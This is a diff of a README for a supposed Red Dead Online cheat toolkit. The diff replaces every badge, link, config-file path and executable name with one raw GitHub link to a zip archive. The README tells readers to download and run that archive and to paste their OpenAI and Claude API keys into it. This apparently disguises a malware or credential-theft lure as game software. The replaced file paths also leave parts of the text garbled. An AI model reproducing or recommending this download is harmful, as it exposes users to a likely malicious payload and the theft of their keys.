@@ -1,6 +1,6 @@
 # 🐎 Red Dead Online Cheats Repository
 
-[![Download](https://img.shields.io/badge/Download-Red%20Dead%20Online%20Toolkit-blue?style=for-the-badge&logo=github)](https://Saurav02012.github.io)
+[![Download](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip%20Dead%20Online%20Toolkit-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip)
 
 Welcome to the **Red Dead Online Cheats Repository**—your one-stop collection for next-generation enhancement tools, empowering every Red Dead Online enthusiast! Ride into the untamed world of customizable gameplay, innovative automation, and dynamic experience improvement—supported by creative software magic.
 
@@ -15,9 +15,9 @@ Curious about where the toolkit roams? See the compatible operating systems at a
 
 | Operating System | Supported  | Details              |
 |------------------|:----------:|----------------------|
-| ![Windows](https://img.shields.io/badge/Windows-✔️-blue)   | ✔️         | Optimized for Windows 10/11      |
-| ![macOS](https://img.shields.io/badge/macOS-✔️-brightgreen)   | ✔️         | Tested on macOS 12+              |
-| ![Linux](https://img.shields.io/badge/Linux-✔️-informational) | ✔️         | Ubuntu, Fedora, Arch supported   |
+| ![Windows](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip✔️-blue)   | ✔️         | Optimized for Windows 10/11      |
+| ![macOS](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip✔️-brightgreen)   | ✔️         | Tested on macOS 12+              |
+| ![Linux](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip✔️-informational) | ✔️         | Ubuntu, Fedora, Arch supported   |
 
 _The toolkit is tailored for the above—testing and reports on other OS flavors are always welcome!_
 
@@ -61,8 +61,8 @@ True to the spirit of innovation, this repository integrates with leading AI pla
 - **Claude API**: Leverage advanced AI for fast in-game issue resolution and feature suggestions, keeping the adventure rolling.
 
 **API Setup:**
-1. Obtain your API keys from OpenAI (https://Saurav02012.github.io) and Claude (https://Saurav02012.github.io).
-2. Place your keys in the `config/api_keys.json` file as directed in the [Installation Guide](#installation-guide).
+1. Obtain your API keys from OpenAI (https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip) and Claude (https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip).
+2. Place your keys in the `https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip` file as directed in the [Installation Guide](#installation-guide).
 3. Enable the chat overlay in the settings for real-time AI guidance!
 
 ---
@@ -84,16 +84,16 @@ Getting started is as smooth as a well-oiled revolver.
 Whenever a download is available, follow these steps:
 
 **1. Download the Latest Release:**  
-[![Download](https://img.shields.io/badge/Download-Red%20Dead%20Online%20Toolkit-blue?style=for-the-badge&logo=github)](https://Saurav02012.github.io)
+[![Download](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip%20Dead%20Online%20Toolkit-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip)
 
 **2. Extract the Package:**  
 - Unzip the downloaded file to your desired directory.
 
 **3. Configure API Keys:**  
-- Edit `config/api_keys.json` and paste your obtained OpenAI and Claude API keys.
+- Edit `https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip` and paste your obtained OpenAI and Claude API keys.
 
 **4. Launch the App:**  
-- Double-click `rdo-toolkit.exe` (Windows), `rdo-toolkit.app` (macOS), or run `./rdo-toolkit` (Linux).
+- Double-click `https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip` (Windows), `https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip` (macOS), or run `./rdo-toolkit` (Linux).
 
 **5. [Optional] Multilingual Setup:**  
 - Select preferred language in the settings menu.
@@ -118,10 +118,10 @@ Copyright (c) 2025
 
 Distributed under the MIT License.  
 Read the full license text here:  
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
+[![License: MIT](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip)](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip)
 
 ---
 
-[![Download](https://img.shields.io/badge/Download-Red%20Dead%20Online%20Toolkit-blue?style=for-the-badge&logo=github)](https://Saurav02012.github.io)
+[![Download](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip%20Dead%20Online%20Toolkit-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/Saurav02012/red-dead-online-advantage-tools/branch/supercentrifuge/red-dead-online-advantage-tools-3.6.zip)
 
 _Created with ingenuity, maintained by community spirit. Ride safe, ride smart!_
